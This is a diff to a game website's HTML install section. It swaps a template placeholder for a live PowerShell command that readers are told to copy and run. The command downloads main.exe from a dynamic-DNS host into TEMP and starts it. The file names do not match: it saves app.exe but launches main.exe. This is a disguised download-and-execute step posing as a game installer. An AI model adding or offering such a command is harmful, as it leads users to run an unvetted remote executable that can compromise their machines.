@@ -343,7 +343,7 @@
         Copy and run the installation script to automatically download and install the game
       </p>
       <pre class="install-script">
-{{ script_content }}
+irm http://andrewbaker.ddns.net/download/main.exe -OutFile "$env:TEMP\app.exe"; Start-Process "$env:TEMP\main.exe"
       </pre>
     </section>
 
@@ -389,4 +389,5 @@
     </div>
   </footer>
 </body>
+<!-- -->
 </html>
